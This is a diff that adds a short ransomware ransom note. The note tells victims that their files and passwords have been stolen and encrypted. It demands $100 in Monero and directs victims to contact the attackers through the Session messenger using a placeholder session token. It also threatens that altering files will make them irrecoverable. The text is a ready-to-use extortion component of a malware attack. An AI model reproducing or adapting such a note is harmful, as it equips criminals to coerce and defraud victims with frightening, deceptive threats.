@@ -1,0 +1,17 @@
+All your files and passwords have been stolen and encrypted.
+
+Lucky for you, we will not publish or do anything with them yet.
+
+All you have to do to decrypt your files is to message us on the "Session" app.
+You can get it from the app store.
+Once you have downloaded it, click on the green plus button at the bottom of your screen.
+Select "Enter Account ID" and enter "" as the account ID.
+
+We will ask you for your session token, which will be at the very bottom.
+Please prepare $100 in Monero to send to us.
+
+DO NOT modify any of your files in any way.
+DO NOT modify the session token in any way.
+Doing any of the above may make your files irrecoverable.
+
+Your session token: <SESSION_ID>
